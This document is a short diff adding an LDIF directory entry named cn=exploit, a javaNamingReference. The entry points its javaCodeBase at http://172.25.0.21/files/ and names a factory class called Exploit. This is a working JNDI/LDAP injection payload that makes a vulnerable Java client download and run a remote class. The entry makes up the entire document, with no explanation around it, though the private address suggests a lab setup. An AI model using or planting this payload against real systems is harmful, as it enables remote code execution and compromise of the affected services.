@@ -1,0 +1,5 @@
+dn: cn=exploit,dc=example,dc=com
+javaClassName: foo
+javaCodeBase: http://172.25.0.21/files/
+objectClass: javaNamingReference
+javaFactory: Exploit
